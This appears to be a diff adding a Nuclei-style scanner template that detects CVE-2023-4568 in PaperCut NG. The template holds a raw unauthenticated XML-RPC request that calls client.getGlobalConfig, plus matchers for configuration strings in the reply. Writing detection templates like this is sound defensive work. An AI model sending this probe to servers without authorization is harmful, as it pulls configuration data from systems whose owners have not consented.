@@ -1,0 +1,35 @@
+id: cve-2023-4568-papercut-ng-xmlrpc
+info:
+  name: PaperCut NG Unauthenticated XMLRPC
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cve-2023-4568,xml-injection
+  description: |
+    This template checks for an unauthenticated XMLRPC vulnerability in PaperCut NG (CVE-2023-4568) via the /rpc/clients/xmlrpc endpoint.
+
+http:
+  - raw:
+      - |
+        POST /rpc/clients/xmlrpc HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0"?>
+        <methodCall>
+          <methodName>client.getGlobalConfig</methodName>
+          <params>
+            <param><value><string>str1</string></value></param>
+            <param><value><string>str2</string></value></param>
+          </params>
+        </methodCall>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<name>conf.auth-ttl-default</name>"
+          - "Register as a New User"
+          - "<int>"
